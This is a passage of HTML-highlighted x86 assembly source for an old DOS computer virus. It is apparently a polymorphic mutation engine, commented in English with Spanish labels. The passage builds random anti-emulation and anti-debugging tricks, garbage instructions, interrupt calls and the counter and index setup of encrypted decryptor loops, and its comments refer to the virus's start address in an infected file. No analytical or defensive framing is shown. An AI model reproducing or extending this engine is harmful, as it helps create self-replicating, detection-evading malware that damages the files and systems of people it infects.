        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">
        </span><span class="sc6">SETNE</span><span class="sc0">   </span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@OtroSalto</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc0">       </span><span class="sc1">; Put a JNZ instruction to the beginning</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">             </span><span class="sc1">; of the LOOP</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">        </span><span class="sc1">; Calculate and store displacement</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
  </span><span class="sc5">@@Continue03</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">JCXZ</span><span class="sc0">  </span><span class="sc5">@@AntRetorna2</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
 </span><span class="sc5">@@AntRetorna2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">STOSW</span><span class="sc0">
   </span><span class="sc5">@@Retorna</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">
   </span><span class="sc5">@@OtroSalto</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">850Fh</span><span class="sc0">     </span><span class="sc1">; Put a 16 bits JNZ instruction</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Continue03</span><span class="sc0">

</span><span class="sc1">;; Another type of anti-emulating. This time is anti-debugging too. It pushes</span><span class="sc0">
</span><span class="sc1">;; a value and pops it, and then subtracts 2 to the stack pointer and pops the</span><span class="sc0">
</span><span class="sc1">;; value again in another register. If the registers are different, it jumps to</span><span class="sc0">
</span><span class="sc1">;; a random address, to fuck it :)</span><span class="sc0">
  </span><span class="sc5">@@Truco03</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Get a random word in AX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">       </span><span class="sc1">; Get a random register</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">       </span><span class="sc1">; SP?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Truco03</span><span class="sc0">       </span><span class="sc1">; Then, repeat</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">        </span><span class="sc1">; Save register</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">         </span><span class="sc1">; Aleatory Zero Flag</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@JumpP001</span><span class="sc0">      </span><span class="sc1">; If Zero Flag, put a word-opcode PUSH</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">       </span><span class="sc1">; Convert to PUSH</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">             </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Continue100</span><span class="sc0">
 </span><span class="sc5">@@JumpP001</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc0">      </span><span class="sc1">; Convert to PUSH</span><span class="sc0">
        </span><span class="sc6">CBW</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">             </span><span class="sc1">; Store it</span><span class="sc0">
 </span><span class="sc5">@@Continue100</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">        </span><span class="sc1">; Restore register</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonPOP2</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">       </span><span class="sc1">; Convert to POP</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">             </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Continue101</span><span class="sc0">   </span><span class="sc1">; Continue</span><span class="sc0">
    </span><span class="sc5">@@PonPOP2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Fh</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
 </span><span class="sc5">@@Continue101</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Get a random word in AX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">       </span><span class="sc1">; Get a manner of subtracting 2 to SP</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonSUB02</span><span class="sc0">      </span><span class="sc1">; If AL=0, do "SUB SP,0002"</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@PonDECDEC</span><span class="sc0">     </span><span class="sc1">; If AL=1, do "DEC SP/DEC SP"</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonADDFE</span><span class="sc0">      </span><span class="sc1">; If AL=2, do "ADD SP,FFFE"</span><span class="sc0">
   </span><span class="sc1">;; Do "ADD SP,-02"</span><span class="sc0">
  </span><span class="sc5">@@PonADDFE2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">83h</span><span class="sc0">       </span><span class="sc1">; Opcode of signed 16 bits operation re-</span><span class="sc0">
                      </span><span class="sc1">; duced to byte</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">             </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEC4h</span><span class="sc0">    </span><span class="sc1">; Store "ADD SP,-02"</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Sigue</span><span class="sc0">         </span><span class="sc1">; Jump and continue</span><span class="sc0">
   </span><span class="sc1">;; Do "SUB SP,0002"</span><span class="sc0">
  </span><span class="sc5">@@PonSUB02</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EC81h</span><span class="sc0">    </span><span class="sc1">; Construct opcode for "SUB SP,xxxx"</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">             </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0002</span><span class="sc0">      </span><span class="sc1">; Put value for subtract</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">             </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Sigue</span><span class="sc0">         </span><span class="sc1">; Jump and continue</span><span class="sc0">
   </span><span class="sc1">;; Do "DEC SP/DEC SP"</span><span class="sc0">
  </span><span class="sc5">@@PonDECDEC</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4C4Ch</span><span class="sc0">     </span><span class="sc1">; Store "DEC SP" twice</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Sigue</span><span class="sc0">         </span><span class="sc1">; Jump and continue</span><span class="sc0">
   </span><span class="sc1">;; Do "ADD SP,FFFE"</span><span class="sc0">
  </span><span class="sc5">@@PonADDFE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C481h</span><span class="sc0">    </span><span class="sc1">; Construct "ADD SP,xxxx"</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">             </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFEh</span><span class="sc0">    </span><span class="sc1">; Put value for add</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">             </span><span class="sc1">; Store it</span><span class="sc0">
    </span><span class="sc5">@@Sigue</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">       </span><span class="sc1">; Get a usable-for-garbage register</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ObtenRegistro</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">        </span><span class="sc1">; Put it in CL</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">        </span><span class="sc1">; Get the saved register from stack</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">       </span><span class="sc1">; Put a POP Garbage-Register</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">         </span><span class="sc1">; Random Zero Flag</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonCMP</span><span class="sc0">        </span><span class="sc1">; If Zero Flag, do "CMP"</span><span class="sc0">
    </span><span class="sc1">;; Do a "SUB Reg,Reg"</span><span class="sc0">
    </span><span class="sc5">@@PonSUB</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Bh</span><span class="sc0">       </span><span class="sc1">; Put "SUB" opcode in AL</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Sigue3</span><span class="sc0">        </span><span class="sc1">; Jump and continue</span><span class="sc0">
    </span><span class="sc5">@@PonCMP</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Bh</span><span class="sc0">       </span><span class="sc1">; Put "CMP" opcode in AL</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">         </span><span class="sc1">; Random Zero Flag</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Sigue2</span><span class="sc0">        </span><span class="sc1">; If Zero Flag, jump</span><span class="sc0">
    </span><span class="sc5">@@Sigue3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">        </span><span class="sc1">;Exchange registers (it is the same for</span><span class="sc0">
                      </span><span class="sc1">; "CMP")</span><span class="sc0">
    </span><span class="sc5">@@Sigue2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">         </span><span class="sc1">; Put register on bits 3,4,5</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">      </span><span class="sc1">; Activate register operation</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">        </span><span class="sc1">; Mix register with AH</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">        </span><span class="sc1">; Mix register to form an opcode</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">             </span><span class="sc1">; Store instruction</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraSinBanderas</span><span class="sc0"> </span><span class="sc1">; Do garbage that doesn't affect</span><span class="sc0">
                         </span><span class="sc1">; to comparement flags</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Siono</span><span class="sc0">         </span><span class="sc1">; JZ or JNZ?</span><span class="sc0">
        </span><span class="sc6">SETE</span><span class="sc0">    </span><span class="sc8">CL</span><span class="sc0">        </span><span class="sc1">; Set CL to 1 to do "JZ"</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">         </span><span class="sc1">; jump 8 bits or jump 16 bits?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@SaltoGordo</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc0">       </span><span class="sc1">; AL=opcode of "JNZ"</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">        </span><span class="sc1">; Make "JZ" if CL=1</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">             </span><span class="sc1">; Store this instruction</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@DoRandomDispl</span><span class="sc0">
   </span><span class="sc5">@@OtraVez19</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@OtraVez19</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@AJAJAJA</span><span class="sc0">
</span><span class="sc5">@@DoRandomDispl</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">
 </span><span class="sc5">@@SaltoGordo</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">850Fh</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Sigueiii</span><span class="sc0">
   </span><span class="sc5">@@OtraVez20</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0007</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@OtraVez20</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
   </span><span class="sc5">@@AJAJAJA</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc5">@@JAJAJAJ</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">  </span><span class="sc5">@@JAJAJAJ</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
 </span><span class="sc5">@@Sigueiii</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">AntiEmulating</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Code to generate a call to a do-nothing function of an interrupt (it only</span><span class="sc0">
</span><span class="sc1">;; works constructiong the second decryptor - the first in order of creation)</span><span class="sc0">
</span><span class="sc5">PonInt</span><span class="sc0">      </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MiraSiPrimerDes</span><span class="sc0"> </span><span class="sc1">; Is it the second decryptor?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Salir</span><span class="sc0">       </span><span class="sc1">; If it isn't, exit</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc1">; Get a random AX</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">    </span><span class="sc1">; Get Zero Flag with 1/4 of probability</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Salir</span><span class="sc0">       </span><span class="sc1">; If not Zero Flag, exit</span><span class="sc0">
    </span><span class="sc5">@@KKAS2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001Eh</span><span class="sc0">   </span><span class="sc1">; Get a random even AX between 0 and</span><span class="sc0">
                    </span><span class="sc1">; 18h</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Pollas</span><span class="sc0">      </span><span class="sc1">; If AX=0, get a random function</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0">    </span><span class="sc5">@@KKAS2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">FuncInterrup</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">;Put address where func-</span><span class="sc0">
                    </span><span class="sc1">; tions and interrupts are stored in SI</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Add AX to SI to get one of the stored</span><span class="sc0">
                    </span><span class="sc1">; functions and interrupts</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get first byte in AH</span><span class="sc0">
     </span><span class="sc5">@@KKAS</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B4h</span><span class="sc0">    </span><span class="sc1">; Construct "MOV AH,xx"</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">           </span><span class="sc1">; Store instruction</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc0">    </span><span class="sc1">; Construct "INT xx"</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">01</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get interrupt number in AH</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">           </span><span class="sc1">; Store instruction</span><span class="sc0">
   </span><span class="sc5">@@Salir</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
   </span><span class="sc5">@@Pollas</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc1">; Get a random word in AX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@KKAS</span><span class="sc0">        </span><span class="sc1">; Jump and continue</span><span class="sc0">
</span><span class="sc5">PonInt</span><span class="sc0">      </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Procedure to put the instruction that sets value to the counter register</span><span class="sc0">
</span><span class="sc5">PonContador</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TamanyoContador</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get counter in CX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistroContador</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get register counter in</span><span class="sc0">
                            </span><span class="sc1">; DL</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0080h</span><span class="sc0">   </span><span class="sc1">; Check if byte counter or word counter</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@ByteCont</span><span class="sc0">    </span><span class="sc1">; If byte counter, jump</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Convert to word counter</span><span class="sc0">
</span><span class="sc5">@@ByteCont</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0001h</span><span class="sc0">   </span><span class="sc1">; Do we increase or decrease the</span><span class="sc0">
                    </span><span class="sc1">; counter in every loop of the decryp-</span><span class="sc0">
                    </span><span class="sc1">; tor?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@RestaCont</span><span class="sc0">   </span><span class="sc1">; If we decrement it every loop, jump</span><span class="sc0">
        </span><span class="sc6">NEG</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">      </span><span class="sc1">; Get the inverse of CX to get an equal</span><span class="sc0">
                    </span><span class="sc1">; count fowards, instead of backwards</span><span class="sc0">
</span><span class="sc5">@@RestaCont</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonInstrucMOV</span><span class="sc0">   </span><span class="sc1">; Put a setting-value instruction</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">PonContador</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Procedure to put the instruction that sets value to the index register</span><span class="sc0">
</span><span class="sc5">PonIndice</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InicioVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get initial address of virus</span><span class="sc0">
                         </span><span class="sc1">; in file in CX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistroIndice</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get register in DL</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0002</span><span class="sc0">         </span><span class="sc1">; Do we add a word to the in-</span><span class="sc0">
                         </span><span class="sc1">; dex?</span><span class="sc0">
